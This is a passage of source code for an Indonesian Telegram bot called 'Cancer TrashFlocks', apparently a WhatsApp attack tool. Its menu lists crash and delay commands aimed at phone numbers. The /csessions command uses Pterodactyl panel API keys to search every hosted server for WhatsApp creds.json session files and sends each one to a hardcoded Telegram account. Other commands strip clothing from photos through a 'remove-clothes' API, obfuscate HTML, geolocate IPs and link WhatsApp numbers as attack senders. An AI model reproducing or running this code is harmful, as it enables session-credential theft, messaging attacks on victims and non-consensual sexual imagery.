    if (!isPrivate(ctx)) {
        return ctx.answerCbQuery("Hanya untuk Private Chat!").catch(() => {});
    }
    try {
        const runtime = getBotRuntime();
        const controlsMenu =
            `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n` +
            `➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」\n` +
            `<b>♅ <tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5258023599419171861"></tg-emoji> Version : 20.0.0</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5462957817918926146"></tg-emoji> Language : JavaScript</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5352752036595116992"></tg-emoji> Prefix : Slash [ / ]</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5188283260496536188"></tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5215327832040811010"></tg-emoji> Runtime : ${runtime}</b>\n\n` +
            `╭───⊱<b> ( 🦄 ) Tools° - Menu</b>\n` +
            `│⌘ /csessions\n` +
            `│⌘ /ssiphone\n` +
            `│⌘ /addsender [ Creds.json ]\n` +
            `│⌘ /brat [ Text ]\n` +
            `│⌘ /enchtml [ Reply File ]\n` +
            `│⌘ /getcode [ Link ]\n` +
            `│⌘ /trackip [ Ip Address ]\n` +
            `│⌘ /tiktokdl [ Url ]\n` +
            `│⌘ /tourl [ Reply Media ]\n` +
            `│⌘ /tonaked [ Reply Image ]\n` +
            `╰───────────────⊱`;
        const button = [[{ text: "「 ♱ 」Cancer BACK", callback_data: "back", style: "Danger", icon_custom_emoji_id: "5462990652943904884" }]];
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: button }
        });
        await ctx.answerCbQuery();
    } catch (e) {
        console.log("toolsmenu error:", e?.message);
        await ctx.answerCbQuery().catch(() => {});
    }
});

bot.action("trashshow", async (ctx) => {
    if (!isPrivate(ctx)) {
        return ctx.answerCbQuery("Hanya untuk Private Chat!").catch(() => {});
    }
    try {
        const runtime = getBotRuntime();
        const bugMenu =
            `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n` +
            `➤「 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐑𝐈𝐎𝐍 」\n` +
            `<b>♅ <tg-emoji emoji-id="5463156928307801722"></tg-emoji> Bot Name : Cancer</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5463081281048818043"></tg-emoji> Developer : Its Dric</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5258023599419171861"></tg-emoji> Version : 20.0.0</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5462957817918926146"></tg-emoji> Language : JavaScript</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5352752036595116992"></tg-emoji> Prefix : Slash [ / ]</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5188283260496536188"></tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
            `<b>♅ <tg-emoji emoji-id="5215327832040811010"></tg-emoji> Runtime : ${runtime}</b>\n\n` +
            `╭───⊱<b> ( 🦠 ) Trash° - Menu</b>\n` +
            `│⌘ /cancerforce 62xx\n` +
            `│⌘ /cancercombi 62xx\n` +
            `│⌘ /cancerdelay 62xx\n` +
            `│⌘ /cancerblank 62xx\n` +
            `│⌘ /cancercombo 62xx\n` +
            `╰───────────────⊱`;
        const button = [[{ text: "「 ♱ 」Cancer Back", callback_data: "back", style: "Danger", icon_custom_emoji_id: "5462990652943904884" }]];
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: button }
        });
        await ctx.answerCbQuery();
    } catch (e) {
        console.log("trashshow error:", e?.message);
        await ctx.answerCbQuery().catch(() => {});
    }
});

bot.action("thanksto", async (ctx) => {
    if (!isPrivate(ctx)) {
        return ctx.answerCbQuery("Hanya untuk Private Chat!").catch(() => {});
    }
    try {
        const runtime = getBotRuntime();
        const tqtoMenu =
            `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n\n` +
            `<b><tg-emoji emoji-id="5402355073458123173"></tg-emoji> Username : ${ctx.from.first_name}</b>\n` +
            `<b><tg-emoji emoji-id="5402355073458123173"></tg-emoji> Runtime : ${runtime}</b>\n\n` +
            `<b> ( 🤝 ) Thanks° - To</b>\n` +
            `❏<tg-emoji emoji-id="5402355073458123173"></tg-emoji> Itss Dricc\n` +
            `❏<tg-emoji emoji-id="5402355073458123173"></tg-emoji> My Partner\n` +
            `❏<tg-emoji emoji-id="5402355073458123173"></tg-emoji> My Support\n` +
            `❏<tg-emoji emoji-id="5402355073458123173"></tg-emoji> My Friend\n` +
            `❏<tg-emoji emoji-id="5402355073458123173"></tg-emoji> All User Cancer TrashFlocks\n` +
            `All User Cancer`;
        const button = [[{ text: "「 ♱ 」BACK", callback_data: "back", style: "Danger", icon_custom_emoji_id: "5462990652943904884" }]];
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: button }
        });
        await ctx.answerCbQuery();
    } catch (e) {
        console.log("thanksto error:", e?.message);
        await ctx.answerCbQuery().catch(() => {});
    }
});

// ==========================================
// [ HELPER: UPDATE DB ]
// ==========================================
const updateDB = (file, data) => {
    try {
        fs.writeFileSync(`./database/${file}.json`, JSON.stringify(data, null, 2));
    } catch (e) {
        console.log("updateDB error:", e?.message);
    }
};

// ==========================================
// [ PRIVATE ONLY: TRACKIP ]
// Premium - Private Only
// ==========================================
bot.command("trackip", async (ctx) => {
    if (!isPrivate(ctx)) return;
    if (!isOwnerOrAdmin(ctx.from.id) && !premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Akses ditolak! Khusus Premium/Admin/Owner.");
    }

    const args = ctx.message.text.split(" ").filter(Boolean);
    if (!args[1]) return ctx.reply("❌ Format: /trackip 8.8.8.8");

    const ip = args[1].trim();

    function isValidIPv4(ip) {
        const parts = ip.split(".");
        if (parts.length !== 4) return false;
        return parts.every(p => {
            if (!/^\d{1,3}$/.test(p)) return false;
            if (p.length > 1 && p.startsWith("0")) return false;
            const n = Number(p);
            return n >= 0 && n <= 255;
        });
    }

    function isValidIPv6(ip) {
        const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
        return ipv6Regex.test(ip);
    }

    if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
        return ctx.reply("❌ IP tidak valid. Contoh IPv4: 8.8.8.8");
    }

    let processingMsg = null;
    try {
        processingMsg = await ctx.reply(`🔎 Tracking IP ${ip} — sedang memproses...`);
    } catch (e) {}

    try {
        const res = await axios.get(
            `https://ipwhois.app/json/${encodeURIComponent(ip)}`,
            { timeout: 10000 }
        );
        const data = res.data;

        if (!data || data.success === false) {
            return ctx.reply(`❌ Gagal mendapatkan data untuk IP: ${ip}`);
        }

        const lat = data.latitude || "";
        const lon = data.longitude || "";
        const mapsUrl = lat && lon
            ? `https://www.google.com/maps?q=${lat},${lon}`
            : null;

        const caption =
            `<blockquote><b>Cᴀɴᴄᴇʀ Tʀᴀsʜғʟᴏᴄᴋs</b></blockquote>\n\n` +
            `⌘ IP: <code>${data.ip || "-"}</code>\n` +
            `⌘ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}\n` +
            `⌘ Region: ${data.region || "-"}\n` +
            `⌘ City: ${data.city || "-"}\n` +
            `⌘ ZIP: ${data.postal || "-"}\n` +
            `⌘ Timezone: ${data.timezone_gmt || "-"}\n` +
            `⌘ ISP: ${data.isp || "-"}\n` +
            `⌘ Org: ${data.org || "-"}\n` +
            `⌘ ASN: ${data.asn || "-"}\n` +
            `⌘ Lat/Lon: ${lat || "-"}, ${lon || "-"}`;

        const replyMarkup = mapsUrl ? {
            inline_keyboard: [[{ text: "🌍 Location", url: mapsUrl, icon_custom_emoji_id: "5463392464314315076" }]]
        } : null;

        try {
            await ctx.replyWithPhoto(thumbnailurl, {
                caption,
                parse_mode: "HTML",
                ...(replyMarkup ? { reply_markup: replyMarkup } : {})
            });
        } catch (e) {
            await ctx.reply(caption, {
                parse_mode: "HTML",
                ...(replyMarkup ? { reply_markup: replyMarkup } : {})
            });
        }

        if (processingMsg) {
            try { await ctx.deleteMessage(processingMsg.message_id); } catch (e) {}
        }

    } catch (e) {
        console.log("trackip error:", e?.message);
        await ctx.reply("❌ Terjadi kesalahan saat mengambil data IP.");
    }
});

// ==========================================
// [ PRIVATE ONLY: TIKTOKDL ]
// Private Only - Semua User Authorized
// ==========================================
bot.command("tiktokdl", async (ctx) => {
    if (!isPrivate(ctx)) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/xxx");

    let url = args;
    if (ctx.message.entities) {
        for (const e of ctx.message.entities) {
            if (e.type === "url") {
                url = ctx.message.text.substr(e.offset, e.length);
                break;
            }
        }
    }

    const wait = await ctx.reply("⏳ Sedang memproses video...");

    try {
        const { data } = await axios.get("https://tikwm.com/api/", {
            params: { url },
            headers: {
                "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
                "accept": "application/json,text/plain,*/*",
                "referer": "https://tikwm.com/"
            },
            timeout: 20000
        });

        if (!data || data.code !== 0 || !data.data) {
            return ctx.reply("❌ Gagal ambil data video. Pastikan link valid.");
        }

        const d = data.data;

        if (Array.isArray(d.images) && d.images.length) {
            const imgs = d.images.slice(0, 10);
            const media = await Promise.all(
                imgs.map(async (img) => {
                    const res = await axios.get(img, { responseType: "arraybuffer" });
                    return { type: "photo", media: { source: Buffer.from(res.data) } };
                })
            );
            await ctx.replyWithMediaGroup(media);
            return;
        }

        const videoUrl = d.play || d.hdplay || d.wmplay;
        if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh.");

        const video = await axios.get(videoUrl, {
            responseType: "arraybuffer",
            headers: {
                "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36"
            },
            timeout: 30000
        });

        await ctx.replyWithVideo(
            { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
            { supports_streaming: true }
        );

    } catch (e) {
        const err = e?.response?.status
            ? `❌ Error ${e.response.status} saat mengunduh video.`
            : "❌ Gagal mengunduh. Koneksi lambat atau link salah.";
        await ctx.reply(err);
    } finally {
        try { await ctx.deleteMessage(wait.message_id); } catch (e) {}
    }
});

// ==========================================
// [ PRIVATE ONLY: CSESSIONS ]
// Owner & Admin - Private Only
// ==========================================
bot.command("csessions", async (ctx) => {
    if (!isPrivate(ctx)) return;
    if (!isOwnerOrAdmin(ctx.from.id)) {
        return ctx.reply("❌ Akses ditolak! Khusus Owner/Admin.");
    }

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply("❌ Format: /csessions https://domain.com,ptla_ID,ptlc_ID");

    const args = text.split(",");
    const domain = args[0];
    const plta = args[1];
    const pltc = args[2];
    const idtele = "7949610714";

    if (!plta || !pltc) {
        return ctx.reply("❌ Format: /csessions https://panelku.com,plta_ID,pltc_ID");
    }

    await ctx.reply("⏳ Sedang scan semua server untuk mencari folder sessions dan file creds.json...");

    const base = domain.replace(/\/+$/, "");
    const headersApp = {
        Accept: "application/json, application/vnd.pterodactyl.v1+json",
        Authorization: `Bearer ${plta}`
    };
    const headersClient = {
        Accept: "application/json, application/vnd.pterodactyl.v1+json",
        Authorization: `Bearer ${pltc}`
    };

    function isDirectory(item) {
        if (!item?.attributes) return false;
        const a = item.attributes;
        if (typeof a.is_file === "boolean") return !a.is_file;
        return (
            a.type === "dir" || a.type === "directory" ||
            a.mode === "dir" || a.mode === "directory" ||
            a.mode === "d" || a.is_directory === true || a.isDir === true
        );
    }

    async function listAllServers() {
        const out = [];
        let page = 1;
        while (true) {
            const r = await axios.get(`${base}/api/application/servers`, {
                params: { page },
                headers: headersApp,
                timeout: 15000
            }).catch(() => ({ data: null }));
            const chunk = r?.data?.data || [];
            out.push(...chunk);
            if (!r?.data?.meta?.pagination?.links?.next || chunk.length === 0) break;
            page++;
        }
        return out;
    }

    async function traverseAndFind(identifier, dir = "/") {
        try {
            const listRes = await axios.get(
                `${base}/api/client/servers/${identifier}/files/list`,
                { params: { directory: dir }, headers: headersClient, timeout: 15000 }
            ).catch(() => ({ data: null }));

            if (!listRes?.data?.data) return [];
            let found = [];

            for (const item of listRes.data.data) {
                const name = item.attributes?.name || item.name || "";
                const itemPath = ((dir === "/" ? "" : dir) + "/" + name).replace(/\/+/g, "/");
                const lower = name.toLowerCase();

                if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
                    const sessRes = await axios.get(
                        `${base}/api/client/servers/${identifier}/files/list`,
                        { params: { directory: itemPath }, headers: headersClient, timeout: 15000 }
                    ).catch(() => ({ data: null }));

                    if (sessRes?.data?.data) {
                        for (const sf of sessRes.data.data) {
                            const sfName = sf.attributes?.name || sf.name || "";
                            if (sfName.toLowerCase() === "creds.json") {
                                found.push({
                                    path: (itemPath + "/" + sfName).replace(/\/+/g, "/"),
                                    name: sfName
                                });
                            }
                        }
                    }
                }

                if (isDirectory(item)) {
                    const more = await traverseAndFind(identifier, itemPath);
                    if (more.length) found = found.concat(more);
                } else if (name.toLowerCase() === "creds.json") {
                    found.push({ path: itemPath, name });
                }
            }
            return found;
        } catch (e) {
            return [];
        }
    }

    try {
        const servers = await listAllServers();
        if (!servers.length) return ctx.reply("❌ Tidak ada server yang bisa discan.");

        let totalFound = 0;

        for (const srv of servers) {
            const identifier = srv.attributes?.identifier || srv.identifier || srv.attributes?.id;
            const name = srv.attributes?.name || srv.name || identifier || "unknown";
            if (!identifier) continue;

            const list = await traverseAndFind(identifier, "/");
            if (!list?.length) continue;

            for (const fileInfo of list) {
                totalFound++;
                const filePath = ("/" + fileInfo.path).replace(/\/+/g, "/").replace(/\/+$/, "");

                await ctx.reply(`📁 Ditemukan creds.json di server ${name}\nPath: ${filePath}`);

                try {
                    const dlRes = await axios.get(
                        `${base}/api/client/servers/${identifier}/files/download`,
                        { params: { file: filePath }, headers: headersClient, timeout: 15000 }
                    ).catch(() => ({ data: null }));

                    const dlUrl = dlRes?.data?.attributes?.url;
                    if (dlUrl) {
                        const fileRes = await axios.get(dlUrl, {
                            responseType: "arraybuffer",
                            timeout: 20000
                        });
                        await ctx.telegram.sendDocument(idtele, {
                            source: Buffer.from(fileRes.data),
                            filename: `${String(name).replace(/\s+/g, "_")}_creds.json`
                        });
                    } else {
                        await ctx.reply(`❌ Gagal URL download: ${filePath} di server ${name}`);
                    }
                } catch (e) {
                    console.log(`csessions download error ${name}:`, e?.message);
                    await ctx.reply(`❌ Error download creds.json dari ${name}`);
                }
            }
        }

        return ctx.reply(
            totalFound === 0
                ? "✔️ Scan selesai. Tidak ditemukan creds.json."
                : `✔️ Scan selesai. Total creds.json ditemukan: ${totalFound}`
        );
    } catch (e) {
        console.log("csessions error:", e?.message);
        return ctx.reply("❌ Terjadi error saat scan.");
    }
});

// ==========================================
// [ PRIVATE ONLY: TOURL ]
// Premium - Private Only
// ==========================================
bot.command("tourl", async (ctx) => {
    if (!isPrivate(ctx)) return;
    if (!isOwnerOrAdmin(ctx.from.id) && !premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Akses ditolak! Khusus Premium/Admin/Owner.");
    }

    const r = ctx.message.reply_to_message;
    if (!r) return ctx.reply("❌ Format: /tourl (reply foto/video)");

    let fileId = null;
    if (r.photo?.length) {
        fileId = r.photo[r.photo.length - 1].file_id;
    } else if (r.video) {
        fileId = r.video.file_id;
    } else if (r.video_note) {
        fileId = r.video_note.file_id;
    } else {
        return ctx.reply("❌ Hanya mendukung foto atau video.");
    }

    const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox...");

    try {
        const tgLink = String(await ctx.telegram.getFileLink(fileId));
        const params = new URLSearchParams();
        params.append("reqtype", "urlupload");
        params.append("url", tgLink);

        const { data } = await axios.post(
            "https://catbox.moe/user/api.php",
            params,
            {
                headers: { "content-type": "application/x-www-form-urlencoded" },
                timeout: 30000
            }
        );

        if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
            await ctx.replyWithHTML(
                `<b>✔️ Berhasil upload!</b>\n\n` +
                `⌘ URL: <code>${data.trim()}</code>`
            );
        } else {
            await ctx.reply("❌ Gagal upload ke catbox.");
        }
    } catch (e) {
        const msg = e?.response?.status
            ? `❌ Error ${e.response.status} saat unggah ke catbox.`
            : "❌ Gagal unggah, coba lagi.";
        await ctx.reply(msg);
    } finally {
        try { await ctx.deleteMessage(wait.message_id); } catch (e) {}
    }
});

// ==========================================
// [ PRIVATE ONLY: BRAT ]
// Private Only - Semua User Authorized
// ==========================================
bot.command("brat", async (ctx) => {
    if (!isPrivate(ctx)) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply("❌ Format: /brat teks kamu");

    try {
        const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(text)}&isVideo=false`;
        const res = await axios.get(apiURL, { responseType: "arraybuffer", timeout: 15000 });
        await ctx.replyWithSticker({ source: Buffer.from(res.data) });
    } catch (e) {
        console.log("brat error:", e?.message);
        return ctx.reply("❌ Gagal membuat stiker brat.");
    }
});

// ==========================================
// [ PRIVATE ONLY: GETCODE ]
// Owner & Admin - Private Only
// ==========================================
bot.command("getcode", async (ctx) => {
    if (!isPrivate(ctx)) return;
    if (!isOwnerOrAdmin(ctx.from.id)) {
        return ctx.reply("❌ Akses ditolak! Khusus Owner/Admin.");
    }

    const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!url) return ctx.reply("❌ Format: /getcode https://namaweb");
    if (!/^https?:\/\//i.test(url)) return ctx.reply("❌ URL tidak valid.");

    try {
        const response = await axios.get(url, {
            responseType: "text",
            headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
            timeout: 20000
        });

        const filePath = path.join(__dirname, "web_source.html");
        fs.writeFileSync(filePath, response.data, "utf-8");

        await ctx.replyWithDocument(
            { source: filePath },
            { caption: `✔️ Sukses Get Code\n⌘ URL: ${url}` }
        );

        fs.unlinkSync(filePath);
    } catch (e) {
        console.log("getcode error:", e?.message);
        return ctx.reply("❌ Error: " + e?.message);
    }
});

// ==========================================
// [ PRIVATE ONLY: ENCHTML ]
// Private Only - Semua User Authorized
// ==========================================
bot.command("enchtml", async (ctx) => {
    if (!isPrivate(ctx)) return;

    if (!ctx.message.reply_to_message?.document) {
        return ctx.reply("❌ Reply file .html yang ingin di-encrypt.");
    }

    try {
        const fileId = ctx.message.reply_to_message.document.file_id;
        const fileInfo = await ctx.telegram.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${TOKEN_BOT}/${fileInfo.file_path}`;

        const response = await axios.get(fileUrl, {
            responseType: "arraybuffer",
            timeout: 20000
        });
        const htmlContent = Buffer.from(response.data).toString("utf8");
        const encoded = Buffer.from(htmlContent, "utf8").toString("base64");

        const encryptedHTML =
            `<!DOCTYPE html>\n<html>\n<head>\n` +
            `<meta charset="utf-8" />\n` +
            `<title>Itss Dric</title>\n` +
            `<script>\n(function(){\n` +
            `  try { document.write(atob("${encoded}")); }\n` +
            `  catch(e){ console.error(e); }\n` +
            `})();\n</script>\n` +
            `</head>\n<body></body>\n</html>`;

        const outputPath = path.join(__dirname, "encbyxcovz.html");
        fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

        await ctx.replyWithDocument(
            { source: outputPath },
            { caption: "✔️ Sukses Encrypt HTML" }
        );

        fs.unlinkSync(outputPath);
    } catch (e) {
        console.log("enchtml error:", e?.message);
        return ctx.reply("❌ Error saat membuat file terenkripsi.");
    }
});

// ==========================================
// [ PRIVATE ONLY: TONAKED ]
// Premium - Private Only
// ==========================================
bot.command("tonaked", async (ctx) => {
    if (!isPrivate(ctx)) return;
    if (!isOwnerOrAdmin(ctx.from.id) && !premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Akses ditolak! Khusus Premium/Admin/Owner.");
    }

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    let imageUrl = args || null;

    if (!imageUrl && ctx.message.reply_to_message?.photo) {
        const fileId = ctx.message.reply_to_message.photo.pop().file_id;
        const fileLink = await ctx.telegram.getFileLink(fileId);
        imageUrl = fileLink.href;
    }

    if (!imageUrl) return ctx.reply("❌ Format: /tonaked (reply gambar atau isi URL)");

    const statusMsg = await ctx.reply("⏳ Memproses gambar...");

    try {
        const res = await fetch(
            `https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`,
            { timeout: 30000 }
        );
        const data = await res.json();
        const hasil = data.result;

        if (!hasil) {
            return ctx.telegram.editMessageText(
                ctx.chat.id, statusMsg.message_id, undefined,
                "❌ Gagal memproses gambar. Pastikan URL atau foto valid."
            );
        }

        await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});
        await ctx.replyWithPhoto(hasil);

    } catch (e) {
        console.log("tonaked error:", e?.message);
        await ctx.telegram.editMessageText(
            ctx.chat.id, statusMsg.message_id, undefined,
            "❌ Terjadi kesalahan saat memproses gambar."
        ).catch(() => {});
    }
});

// ==========================================
// [ PRIVATE ONLY: SSIPHONE ]
// Private Only - Semua User Authorized
// ==========================================
bot.command("ssiphone", async (ctx) => {
    if (!isPrivate(ctx)) return;

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) {
        return ctx.reply("❌ Format: /ssiphone 18:00|40|Indosat|teks pesan");
    }

    const [time, battery, carrier, ...msgParts] = text.split("|");
    if (!time || !battery || !carrier || msgParts.length === 0) {
        return ctx.reply("❌ Format: /ssiphone 18:00|40|Indosat|teks pesan");
    }

    const wait = await ctx.reply("⏳ Wait a moment...");

    try {
        const messageText = encodeURIComponent(msgParts.join("|").trim());
        const url =
            `https://brat.siputzx.my.id/iphone-quoted` +
            `?time=${encodeURIComponent(time)}` +
            `&batteryPercentage=${battery}` +
            `&carrierName=${encodeURIComponent(carrier)}` +
            `&messageText=${messageText}` +
            `&emojiStyle=apple`;

        const res = await fetch(url, { timeout: 20000 });
        if (!res.ok) return ctx.reply("❌ Gagal mengambil data dari API.");

        const arrayBuffer = await res.arrayBuffer();
        const buffer = Buffer.from(arrayBuffer);

        await ctx.replyWithPhoto(
            { source: buffer },
            { caption: "✔️ Sukses Generate iPhone Screenshot" }
        );

    } catch (e) {
        console.log("ssiphone error:", e?.message);
        return ctx.reply("❌ Terjadi kesalahan saat menghubungi API.");
    } finally {
        try { await ctx.deleteMessage(wait.message_id); } catch (e) {}
    }
});

bot.command("addsender", async (ctx) => {
    if (!isPrivate(ctx)) {
        return ctx.reply("⚠️ Command ini hanya bisa digunakan di DM bot!").catch(() => {});
    }
    if (!isOwner(ctx)) {
        return ctx.reply("❌ Akses ditolak! Khusus Owner.").catch(() => {});
    }

    const args = ctx.message.text.split(" ");
    const phoneNumber = args[1]?.replace(/[^0-9]/g, "");

    if (!phoneNumber || phoneNumber.length < 10) {
        return ctx.replyWithHTML(
            `<b>❌ Format salah!</b>\n\n` +
            `Gunakan: <code>/addsender 628xxxxxxxxxx</code>\n` +
            `Contoh : <code>/addsender 6281234567890</code>`
        ).catch(() => {});
    }

    let loadingMsg = null;

    try {
        loadingMsg = await ctx.telegram.sendPhoto(ctx.chat.id, CONNECT_IMAGE, {
            caption:
                `<pre><code class="language-yaml">` +
                `╔══════ PROCESSING ═════════════╗\n\n` +
                `  ⏳ Generating Pairing Code...\n` +
                `  Nomor : +${phoneNumber}\n` +
                `  Please wait...\n\n` +
                `╚═══════════════════════════════╝` +
                `</code></pre>`,
            parse_mode: "HTML"
        }).catch(() => null);

        const sessionPath = `./session/${phoneNumber}`;

        try {
            if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
            }
            fs.mkdirSync(sessionPath, { recursive: true });
        } catch (fsErr) {
            console.log("Session error:", fsErr?.message);
        }

        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: state,
            printQRInTerminal: false,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            connectTimeoutMs: 60000,
            defaultQueryTimeoutMs: 0,
            keepAliveIntervalMs: 5000,
            retryRequestDelayMs: 250,  // ← satu-satunya tambahan
            logger: pino({ level: "silent" }),
            markOnlineOnConnect: false,
            syncFullHistory: false,
            fireInitQueries: false
        });

        global.waSocket = sock;
        global.conn = sock;
        if (!global.activeSenders) global.activeSenders = new Map();
        global.activeSenders.set(phoneNumber, sock);
        sock.ev.on("creds.update", saveCreds);

        // Sama persis seperti versi yang berhasil
        await new Promise(resolve => setTimeout(resolve, 3000));

        let pairingCode;
        try {
            pairingCode = await sock.requestPairingCode(phoneNumber, "CNCRDRIC");
        } catch (e) {
            if (loadingMsg) {
                await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});
            }
            return ctx.replyWithHTML(
                `<b>❌ Gagal generate pairing code!</b>\n\n` +
                `<code>${e?.message || "Unknown error"}</code>\n\n` +
                `Coba ketik ulang:\n<code>/addsender ${phoneNumber}</code>`
            ).catch(() => {});
        }

        // Tampilkan selalu sebagai CNCR-DRIC
        const formattedCode = "CNCR-DRIC";

        if (loadingMsg) {
            await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});
        }

        await ctx.replyWithHTML(
            `<blockquote><b>｢ PAIRING CODE READY ｣</b></blockquote>\n\n` +
            `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
            `⌘ Code   : <code>${formattedCode}</code>\n\n` +
            `<b>Cara pairing:</b>\n` +
            `1. Buka WhatsApp di HP\n` +
            `2. Ketuk ⋮ → <b>Perangkat Tertaut</b>\n` +
            `3. Ketuk <b>Tautkan Perangkat</b>\n` +
            `4. Pilih <b>Tautkan dengan nomor telepon</b>\n` +
            `5. Masukkan kode di atas\n\n` +
            `⚠️ Kode berlaku <b>60 detik</b>`
        ).catch(() => {});

        let isConnected = false;
        let reconnectAttempt = 0;
        const maxReconnect = 5;

        sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open") {
                isConnected = true;
                reconnectAttempt = 0;
                if (!global.activeSenders) global.activeSenders = new Map();
                global.activeSenders.set(phoneNumber, sock);
                await ctx.telegram.sendPhoto(ctx.chat.id, CONNECT_IMAGE, {
                    caption:
                        `<pre><code class="language-yaml">` +
                        `╔══════ CONNECTED ══════════════╗\n\n` +
                        `  Status  : 🟢 ONLINE\n` +
                        `  Nomor   : +${phoneNumber}\n` +
                        `  Engine  : Baileys v6\n` +
                        `  Code    : CNCR-DRIC\n\n` +
                        `  Sender siap digunakan!\n\n` +
                        `╚═══════════════════════════════╝` +
                        `</code></pre>`,
                    parse_mode: "HTML"
                }).catch(() => {});
            }

            if (connection === "close") {
                isConnected = false;
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const isLoggedOut = statusCode === DisconnectReason.loggedOut;

                if (isLoggedOut) {
                    await ctx.replyWithHTML(
                        `<b>⚠️ Session Tidak Valid!</b>\n\n` +
                        `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
                        `⌘ Status : 🔴 Offline\n\n` +
                        `Gunakan <code>/addsender ${phoneNumber}</code> untuk ulangi.`
                    ).catch(() => {});

                    try {
                        if (fs.existsSync(sessionPath)) {
                            fs.rmSync(sessionPath, { recursive: true, force: true });
                        }
                    } catch (e) {}

                } else if (reconnectAttempt < maxReconnect) {
                    reconnectAttempt++;
                    console.log(`[WA] Reconnect ${reconnectAttempt}/${maxReconnect} for ${phoneNumber}`);

                    setTimeout(async () => {
                        try {
                            const { state: newState, saveCreds: newSaveCreds } = await useMultiFileAuthState(sessionPath);
                            const { version: newVersion } = await fetchLatestBaileysVersion();

                            const newSock = makeWASocket({
                                version: newVersion,
                                auth: newState,
                                printQRInTerminal: false,
                                browser: ["Ubuntu", "Chrome", "20.0.04"],
                                connectTimeoutMs: 60000,
                                defaultQueryTimeoutMs: 0,
                                keepAliveIntervalMs: 5000,
                                retryRequestDelayMs: 250,
                                logger: pino({ level: "silent" }),
                                markOnlineOnConnect: false,
                                syncFullHistory: false,
                                fireInitQueries: false
                            });

                            global.waSocket = newSock;
                            global.conn = newSock;
                            if (!global.activeSenders) global.activeSenders = new Map();
                            global.activeSenders.set(phoneNumber, newSock);
                            newSock.ev.on("creds.update", newSaveCreds);

                            newSock.ev.on("connection.update", async (u) => {
                                if (u.connection === "open") {
                                    isConnected = true;
                                    reconnectAttempt = 0;
                                    await ctx.replyWithHTML(
                                        `<blockquote><b>✔️ WHATSAPP TERHUBUNG!</b></blockquote>\n\n` +
                                        `⌘ Nomor  : <code>+${phoneNumber}</code>\n` +
                                        `⌘ Status : 🟢 Online\n\n` +
                                        `<i>Sender siap digunakan!</i>`
                                    ).catch(() => {});
                                }
                            });

                            newSock.ev.on("creds.update", newSaveCreds);

                        } catch (e) {
                            console.log(`[WA] Reconnect error: ${e?.message}`);
                        }
